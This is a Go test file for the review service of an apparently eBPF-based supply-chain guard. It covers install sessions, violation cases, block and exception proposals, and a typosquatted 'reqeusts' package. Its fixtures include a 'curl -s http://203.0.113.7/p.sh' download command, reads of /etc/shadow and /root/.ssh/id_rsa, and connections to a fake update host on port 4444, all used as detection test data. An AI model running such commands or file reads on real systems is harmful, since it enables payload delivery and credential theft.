package review

import (
	"slices"
	"testing"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/rules"
)

func TestNormalizePackage(t *testing.T) {
	cases := []struct{ mgr, raw, want string }{
		{"pip", "./reqeusts", "pip:reqeusts"},
		{"pip", "/home/me/deploy/demo/reqeusts/", "pip:reqeusts"},
		{"pip", "Reqeusts==1.0.2", "pip:reqeusts"},
		{"pip", "numpy>=1.21", "pip:numpy"},
		{"pip", "requests[socks]", "pip:requests"},
		{"pip", "Typing_Extensions", "pip:typing-extensions"},
		{"npm", "lodash@4", "npm:lodash"},
		{"npm", "@types/node", "npm:@types/node"},
		{"npm", "@types/node@20.1.0", "npm:@types/node"},
		{"npm", "./local-pkg", "npm:local-pkg"},
		{"cargo", "ripgrep@14.1.0", "cargo:ripgrep"},
	}
	for _, c := range cases {
		got, err := NormalizePackage(c.mgr, c.raw)
		if err != nil || got != c.want {
			t.Errorf("NormalizePackage(%q, %q) = %q, %v; want %q", c.mgr, c.raw, got, err, c.want)
		}
	}
	for _, bad := range [][2]string{{"apt", "x"}, {"pip", "  "}, {"pip", "==1.0"}} {
		if _, err := NormalizePackage(bad[0], bad[1]); err == nil {
			t.Errorf("NormalizePackage(%q, %q) must fail", bad[0], bad[1])
		}
	}
}

func TestStartInstallValidation(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	bad := []StartInput{
		{Manager: "apt", Packages: []string{"x"}, Container: "sg-install-1"},
		{Manager: "pip", Packages: nil, Container: "sg-install-1"},
		{Manager: "pip", Packages: []string{"x"}, Container: "web-api"},
	}
	for _, in := range bad {
		if _, err := e.svc.StartInstall(ctx, in); ErrorKind(err) != KindInvalid {
			t.Errorf("%+v: want invalid, got %v", in, err)
		}
	}
	in := StartInput{Manager: "pip", Packages: []string{"x"}, Container: "sg-install-1"}
	if _, err := e.svc.StartInstall(ctx, in); err != nil {
		t.Fatal(err)
	}
	if _, err := e.svc.StartInstall(ctx, in); ErrorKind(err) != KindConflict {
		t.Fatalf("duplicate container: want conflict, got %v", err)
	}
}

// 설치 결과: 진행 중 → (위반) 경고 → 격리, 끝 보고 → 통과 · 설치 실패, 종료 10분 뒤에도 끝 보고 없음 → 결과 미확인
func TestInstallStatuses(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	start := func(name string) model.InstallSession {
		s, err := e.svc.StartInstall(ctx, StartInput{Manager: "pip", Packages: []string{"requests"}, Container: name, Image: "python:3.12-slim"})
		if err != nil {
			t.Fatal(err)
		}
		if s.Status != model.InstallRunning || s.CaseID != nil || s.FinishedAt != nil {
			t.Fatalf("new session: %+v", s)
		}
		return s
	}
	status := func(id string) model.InstallStatus {
		s, err := e.svc.GetInstall(id)
		if err != nil {
			t.Fatal(err)
		}
		return s.Status
	}

	passed := start("sg-install-pip-a")
	if _, err := e.svc.FinishInstall(ctx, passed.ID, 0); err != nil {
		t.Fatal(err)
	}
	if status(passed.ID) != model.InstallPassed {
		t.Fatal("exit 0 without violations must pass")
	}
	if _, err := e.svc.FinishInstall(ctx, passed.ID, 0); ErrorKind(err) != KindConflict {
		t.Fatalf("second finish: want conflict, got %v", err)
	}
	if _, err := e.svc.FinishInstall(ctx, "ins-9999", 0); ErrorKind(err) != KindNotFound {
		t.Fatalf("missing session: want not found, got %v", err)
	}

	failed := start("sg-install-pip-b")
	_, _ = e.svc.FinishInstall(ctx, failed.ID, 1)
	if status(failed.ID) != model.InstallFailed {
		t.Fatal("non-zero exit must be failed")
	}

	warned := start("sg-install-pip-c")
	ev := sandboxEv("sg-install-pip-c")
	// pypi.org 는 sandbox-egress 허용 도메인이라 통과, 포트 9418 은 egress-allowlist 경고
	ev.Kind, ev.DstIP, ev.DstPort, ev.DstHost = model.KindConnect, "140.82.112.3", 9418, "pypi.org"
	v := e.observe(t, ev)
	if v.Action != model.ActionAlert || v.CaseID == nil || v.Install == nil || v.Install.ID != warned.ID || v.Install.Label != "pip requests" {
		t.Fatalf("alert in a session must open a case and carry the session: %+v", v)
	}
	if status(warned.ID) != model.InstallWarned {
		t.Fatal("alert must warn")
	}
	ev2 := sandboxEv("sg-install-pip-c")
	ev2.Kind, ev2.Path = model.KindOpen, "/etc/shadow"
	v2 := e.observe(t, ev2)
	if status(warned.ID) != model.InstallIsolated || *v2.CaseID != *v.CaseID {
		t.Fatal("a kill in the same session must isolate it, same case")
	}
	c, _ := e.svc.GetCase(*v.CaseID)
	if c.Source != model.CaseInstall || c.Violations != 2 || c.Level != model.LevelKilled || c.Package != "pip:requests" ||
		c.InstallID == nil || *c.InstallID != warned.ID || !slices.Equal(c.RuleIDs, []string{"egress-allowlist", "sensitive-files"}) {
		t.Fatalf("install case: %+v", c)
	}
	_, _ = e.svc.FinishInstall(ctx, warned.ID, 137)
	if status(warned.ID) != model.InstallIsolated {
		t.Fatal("violations win over the exit code")
	}

	unknown := start("sg-install-pip-d")
	e.svc.ContainerExited(model.Event{ContainerName: "sg-install-pip-d", Timestamp: e.now})
	e.now = e.now.Add(9 * time.Minute)
	if status(unknown.ID) != model.InstallRunning {
		t.Fatal("within 10 minutes it is still running")
	}
	e.now = e.now.Add(2 * time.Minute)
	if status(unknown.ID) != model.InstallUnknown {
		t.Fatal("10 minutes after the container exit without finish → unknown")
	}
	if got := e.svc.ListInstalls(InstallQuery{Status: model.InstallUnknown}); len(got) != 1 || got[0].ID != unknown.ID {
		t.Fatalf("status filter must use the computed status: %+v", got)
	}

	refused, err := e.svc.RefusedInstall(ctx, RefusedInput{Manager: "pip", Packages: []string{"./reqeusts"}, Value: "pip:reqeusts"})
	if err != nil || refused.Status != model.InstallRefused || refused.RefusedBy.Value != "pip:reqeusts" {
		t.Fatalf("refused: %+v %v", refused, err)
	}
	if _, err := e.svc.FinishInstall(ctx, refused.ID, 0); ErrorKind(err) != KindConflict {
		t.Fatal("a refused session cannot be finished")
	}
	all := e.svc.ListInstalls(InstallQuery{})
	if len(all) != 5 || all[0].ID != refused.ID {
		t.Fatalf("newest first: %+v", all)
	}
	if got := e.svc.ListInstalls(InstallQuery{Limit: 2}); len(got) != 2 {
		t.Fatalf("limit: %d", len(got))
	}
}

// 활동 요약은 정상 이벤트까지 모은다. 같은 위반은 count 로 묶는다.
func TestInstallActivity(t *testing.T) {
	e := newEnv(t)
	s, _ := e.svc.StartInstall(t.Context(), StartInput{Manager: "pip", Packages: []string{"requests"}, Container: "sg-install-pip-1"})
	for range 3 {
		ev := sandboxEv(s.Container)
		ev.Kind, ev.DstIP, ev.DstPort, ev.DstHost = model.KindConnect, "151.101.0.223", 443, "pypi.org"
		e.observe(t, ev)
	}
	ev := sandboxEv(s.Container)
	ev.Kind, ev.Comm, ev.Args = model.KindExec, "pip", "pip install requests"
	e.observe(t, ev)
	for range 2 {
		ev := sandboxEv(s.Container)
		ev.Kind, ev.Comm, ev.Args = model.KindExec, "curl", "curl -s http://203.0.113.7/p.sh"
		e.observe(t, ev)
	}
	got, _ := e.svc.GetInstall(s.ID)
	a := got.Activity
	if a.Kinds[model.KindConnect] != 3 || a.Kinds[model.KindExec] != 3 || a.Kinds[model.KindOpen] != 0 {
		t.Fatalf("kinds: %+v", a.Kinds)
	}
	if len(a.Hosts) != 1 || a.Hosts[0] != (model.HostActivity{Host: "pypi.org", IP: "151.101.0.223", Port: 443, Count: 3, Level: model.LevelNormal}) {
		t.Fatalf("hosts: %+v", a.Hosts)
	}
	if len(a.Programs) != 2 || a.Programs[1].Count != 2 || a.Programs[1].Level != model.LevelKilled {
		t.Fatalf("programs: %+v", a.Programs)
	}
	if len(got.Violations) != 1 || got.Violations[0].Count != 2 || got.Violations[0].RuleID != "no-shell-download" {
		t.Fatalf("violations: %+v", got.Violations)
	}
	if got.ContainerID != sandboxCID || got.Image != "python:3.12-slim" {
		t.Fatal("container id / image must come from the first event")
	}
	c, _ := e.svc.GetCase(*got.CaseID)
	if c.Violations != 2 {
		t.Fatalf("case violations: %d", c.Violations)
	}
}

// 런타임: 격리됨 · 격리 대상만 건을 연다. 같은 이름의 열린(open · decided) 건이 있으면 위반 수만 는다. 종결 뒤에는 새 건.
func TestRuntimeCases(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	ev := func(kind model.Kind) model.Event {
		x := model.Event{Kind: kind, ContainerID: sandboxCID, ContainerName: "pkg-reqeusts", ImageName: "demo/reqeusts:1.0.2"}
		switch kind {
		case model.KindConnect:
			x.DstIP, x.DstPort, x.DstHost = "203.0.113.7", 8081, "cdn.reqeusts-update.test"
		case model.KindOpen:
			x.Path = "/root/.ssh/id_rsa"
		}
		return x
	}
	if v := e.observe(t, ev(model.KindConnect)); v.Action != model.ActionAlert || v.CaseID != nil {
		t.Fatalf("an alert alone must not open a runtime case: %+v", v)
	}
	v1 := e.observe(t, ev(model.KindOpen))
	v2 := e.observe(t, ev(model.KindOpen))
	if v1.CaseID == nil || *v1.CaseID != *v2.CaseID {
		t.Fatal("kills in the same container go to one case")
	}
	c, _ := e.svc.GetCase(*v1.CaseID)
	if c.Source != model.CaseRuntime || c.Violations != 2 || c.Package != "" || c.InstallID != nil || c.Image != "demo/reqeusts:1.0.2" {
		t.Fatalf("runtime case: %+v", c)
	}
	if _, _, err := e.svc.Decide(ctx, c.ID, model.DecisionMalicious, ""); err != nil {
		t.Fatal(err)
	}
	if v := e.observe(t, ev(model.KindOpen)); *v.CaseID != c.ID {
		t.Fatal("a decided case still collects violations")
	}
	p := e.svc.ListProposals("")[0]
	if _, _, err := e.svc.Discard(ctx, p.ID, ""); err != nil {
		t.Fatal(err)
	}
	if v := e.observe(t, ev(model.KindOpen)); v.CaseID == nil || *v.CaseID == c.ID {
		t.Fatal("after closing, a new kill opens a new case")
	}
	if n := len(e.svc.ListCases(CaseQuery{Source: model.CaseRuntime})); n != 2 {
		t.Fatalf("runtime cases: %d", n)
	}
	if n := len(e.svc.ListCases(CaseQuery{State: model.CaseClosed})); n != 1 {
		t.Fatalf("closed cases: %d", n)
	}
	e.hub.mu.Lock()
	n := len(e.hub.cases)
	e.hub.mu.Unlock()
	if n < 5 {
		t.Fatalf("case changes must be broadcast, got %d", n)
	}
}

func TestDecide(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	if _, _, err := e.svc.Decide(ctx, "case-0001", "maybe", ""); ErrorKind(err) != KindInvalid {
		t.Fatalf("bad decision: %v", err)
	}
	if _, _, err := e.svc.Decide(ctx, "case-0001", model.DecisionMalicious, ""); ErrorKind(err) != KindNotFound {
		t.Fatalf("missing case: %v", err)
	}
	c, p := e.maliciousInstallCase(t)
	if c.State != model.CaseDecided || c.Decision != model.DecisionMalicious || c.DecidedBy == nil || *c.DecidedBy != DefaultActor ||
		c.ProposalID == nil || *c.ProposalID != p.ID {
		t.Fatalf("decided case: %+v", c)
	}
	want := []model.ProposalChange{
		{Op: "block", List: model.ListPackages, Value: "pip:reqeusts"},
		{Op: "block", List: model.ListHosts, Value: "cdn.reqeusts-update.test"},
	}
	if p.State != model.ProposalDraft || p.CreatedBy != DefaultActor || !slices.Equal(p.Changes, want) {
		t.Fatalf("proposal: %+v", p)
	}
	if _, _, err := e.svc.Decide(ctx, c.ID, model.DecisionFalsePositive, ""); ErrorKind(err) != KindConflict {
		t.Fatalf("second decide: %v", err)
	}
}

// 악성 런타임 건 = 이미지 차단 + 도메인 차단. IP 만 있는 통신은 도메인 차단을 만들지 않는다.
func TestMaliciousRuntimeProposal(t *testing.T) {
	e := newEnv(t)
	base := model.Event{Kind: model.KindConnect, ContainerID: sandboxCID, ContainerName: "pkg-reqeusts", ImageName: "demo/reqeusts:1.0.2", DstPort: 4444}
	a, b := base, base
	a.DstIP, a.DstHost = "203.0.113.7", "CDN.Reqeusts-Update.test."
	b.DstIP = "203.0.113.9"
	v := e.observe(t, a)
	e.observe(t, b)
	_, p, err := e.svc.Decide(t.Context(), *v.CaseID, model.DecisionMalicious, "")
	if err != nil {
		t.Fatal(err)
	}
	want := []model.ProposalChange{
		{Op: "block", List: model.ListImages, Value: "demo/reqeusts:1.0.2"},
		{Op: "block", List: model.ListHosts, Value: "cdn.reqeusts-update.test"},
	}
	if !slices.Equal(p.Changes, want) || len(p.Notes) != 1 {
		t.Fatalf("changes %+v notes %v", p.Changes, p.Notes)
	}
}

// 오탐: 실행 규칙 · 금지 목록(deny*) 규칙은 자동 예외 없이 안내만, 파일은 allowPaths, 도메인 없는 통신은 allowCidrs IP/32
func TestFalsePositiveProposal(t *testing.T) {
	e := newEnv(t)
	evs := []model.Event{
		{Kind: model.KindExec, Comm: "curl", Args: "curl -s http://x"},
		{Kind: model.KindConnect, DstIP: "203.0.113.7", DstPort: 4444},
		{Kind: model.KindOpen, Path: "/root/.ssh/known_hosts"},
		{Kind: model.KindConnect, DstIP: "198.51.100.4", DstPort: 8443},
	}
	var cid string
	for _, ev := range evs {
		ev.ContainerID, ev.ContainerName, ev.ImageName = sandboxCID, "worker", "python:3.12-slim"
		v := e.observe(t, ev)
		if v.CaseID != nil {
			cid = *v.CaseID
		}
	}
	_, p, err := e.svc.Decide(t.Context(), cid, model.DecisionFalsePositive, "")
	if err != nil {
		t.Fatal(err)
	}
	// 경고(198.51.100.4:8443)도 열린 건에 들어가므로 예외 대상 (결정 2026-10-15)
	want := []model.ProposalChange{
		{Op: "except", RuleID: "sensitive-files", Field: "allowPaths", Value: "/root/.ssh/known_hosts"},
		{Op: "except", RuleID: "egress-allowlist", Field: "allowCidrs", Value: "198.51.100.4/32"},
	}
	if !slices.Equal(p.Changes, want) {
		t.Fatalf("changes: %+v", p.Changes)
	}
	if len(p.Notes) != 2 {
		t.Fatalf("exec + deny-list notes expected, got %v", p.Notes)
	}
}

// 미리보기: 지금 규칙과 제안 사본으로 저장된 감사 로그를 다시 평가해 결과가 바뀐 행만, 패키지 · 이미지 차단은 nextOnly
func TestPreview(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	// 과거 경고 2건: web-api → github.com:9418 (egress-allowlist)
	for range 2 {
		e.observe(t, model.Event{Kind: model.KindConnect, ContainerID: sandboxCID, ContainerName: "web-api", DstIP: "140.82.112.3", DstPort: 9418, DstHost: "github.com"})
	}
	// 과거 경고 1건: 다른 컨테이너가 악성 도메인으로 (도메인 차단 뒤에는 격리됨)
	e.observe(t, model.Event{Kind: model.KindConnect, ContainerID: sandboxCID, ContainerName: "worker", DstIP: "203.0.113.7", DstPort: 8081, DstHost: "cdn.reqeusts-update.test"})

	_, p := e.maliciousInstallCase(t)
	pv, err := e.svc.Preview(ctx, p.ID)
	if err != nil {
		t.Fatal(err)
	}
	if pv.Evaluated != 4 || pv.Counts.ToBlocked != 1 || pv.Counts.ToNormal != 0 || len(pv.Changed) != 1 {
		t.Fatalf("malicious preview: %+v", pv)
	}
	if r := pv.Changed[0]; r.Before != model.LevelAlert || r.After != model.LevelKilled || r.Container != "worker" || r.RuleID != "egress-allowlist" {
		t.Fatalf("row: %+v", r)
	}
	if !slices.Equal(pv.NextOnly, []model.BlockRef{{List: model.ListPackages, Value: "pip:reqeusts"}}) {
		t.Fatalf("nextOnly: %+v", pv.NextOnly)
	}

	// 오탐 제안(직접 만든 초안): egress-allowlist 에 github.com 예외 → 과거 2건이 정상으로
	fp := model.Proposal{ID: "prop-0100", CaseID: "case-x", State: model.ProposalDraft,
		Changes: []model.ProposalChange{{Op: "except", RuleID: "egress-allowlist", Field: "allowHosts", Value: "github.com"}}}
	e.svc.mu.Lock()
	e.svc.putProposal(&fp)
	e.svc.mu.Unlock()
	pv, _ = e.svc.Preview(ctx, fp.ID)
	if pv.Counts.ToNormal != 2 || len(pv.Changed) != 2 || len(pv.NextOnly) != 0 {
		t.Fatalf("false-positive preview: %+v", pv)
	}
	if rs := e.engine.Rules(); slices.ContainsFunc(rs, func(r rules.Rule) bool { return slices.Contains(r.AllowHosts, "github.com") }) {
		t.Fatal("preview must not change the engine")
	}
	if _, err := e.svc.Preview(ctx, "prop-9999"); ErrorKind(err) != KindNotFound {
		t.Fatal("missing proposal")
	}
}

// 다시 시작해도 저장소에서 세션 · 건 · 제안 · 이력을 읽고, id 번호를 이어 간다.
func TestPersistAndReload(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	_, p := e.maliciousInstallCase(t)
	if _, _, err := e.svc.Apply(ctx, p.ID, ""); err != nil {
		t.Fatal(err)
	}
	e.svc.Flush(ctx) // Observe 로 바뀐 활동 요약

	e2 := New(Options{Store: e.store, Policies: e.store.Memory, Audit: e.store.Memory, Engine: rules.New(nil), Now: func() time.Time { return e.now }})
	if err := e2.Load(ctx); err != nil {
		t.Fatal(err)
	}
	ss := e2.ListInstalls(InstallQuery{})
	if len(ss) != 1 || ss[0].Status != model.InstallIsolated || ss[0].Activity.Kinds[model.KindConnect] != 1 {
		t.Fatalf("installs after reload: %+v", ss)
	}
	if cs := e2.ListCases(CaseQuery{}); len(cs) != 1 || cs[0].State != model.CaseClosed {
		t.Fatalf("cases after reload: %+v", cs)
	}
	if len(e2.Blocklist().Packages) != 1 || len(e2.ListChanges(0)) != 1 {
		t.Fatal("blocklist / changes after reload")
	}
	s, err := e2.StartInstall(ctx, StartInput{Manager: "npm", Packages: []string{"lodash"}, Container: "sg-install-npm-2"})
	if err != nil || s.ID != "ins-0002" {
		t.Fatalf("ids must continue: %s %v", s.ID, err)
	}
}

// 차단 확인은 정규화한 값으로 찾는다.
func TestCheckPackage(t *testing.T) {
	e := newEnv(t)
	_, p := e.maliciousInstallCase(t)
	_, _, _ = e.svc.Apply(t.Context(), p.ID, "")
	r, err := e.svc.CheckPackage("pip", "Reqeusts==2.0")
	if err != nil || !r.Blocked || r.Value != "pip:reqeusts" || r.CaseID == nil {
		t.Fatalf("blocked: %+v %v", r, err)
	}
	if r, _ := e.svc.CheckPackage("pip", "requests"); r.Blocked || r.Value != "pip:requests" || r.CaseID != nil {
		t.Fatalf("not blocked: %+v", r)
	}
	if r, _ := e.svc.CheckPackage("npm", "reqeusts"); r.Blocked {
		t.Fatal("the manager is part of the key")
	}
	if _, err := e.svc.CheckPackage("apt", "x"); ErrorKind(err) != KindInvalid {
		t.Fatal("bad manager")
	}
}

// 차단 이미지: 시작 이벤트에서 확인한다. 설치 세션 컨테이너면 id · 이미지를 채운다.
func TestContainerStarted(t *testing.T) {
	e := newEnv(t)
	ctx := t.Context()
	ev := model.Event{Kind: model.KindOpen, ContainerID: sandboxCID, ContainerName: "pkg-reqeusts", ImageName: "demo/reqeusts:1.0.2", Path: "/etc/shadow"}
	v := e.observe(t, ev)
	_, p, _ := e.svc.Decide(ctx, *v.CaseID, model.DecisionMalicious, "")
	if _, _, err := e.svc.Apply(ctx, p.ID, ""); err != nil {
		t.Fatal(err)
	}
	if img, ok := e.svc.ContainerStarted(model.Event{ContainerName: "pkg-reqeusts", ImageName: "demo/reqeusts:1.0.2"}); !ok || img != "demo/reqeusts:1.0.2" {
		t.Fatal("blocked image must be reported")
	}
	if _, ok := e.svc.ContainerStarted(model.Event{ContainerName: "web-api", ImageName: "node:22-alpine"}); ok {
		t.Fatal("other images pass")
	}
	s, _ := e.svc.StartInstall(ctx, StartInput{Manager: "pip", Packages: []string{"x"}, Container: "sg-install-pip-9"})
	e.svc.ContainerStarted(model.Event{ContainerID: sandboxCID, ContainerName: s.Container, ImageName: "python:3.12-slim"})
	if got, _ := e.svc.GetInstall(s.ID); got.ContainerID != sandboxCID || got.Image != "python:3.12-slim" {
		t.Fatalf("session must learn its container: %+v", got)
	}
}
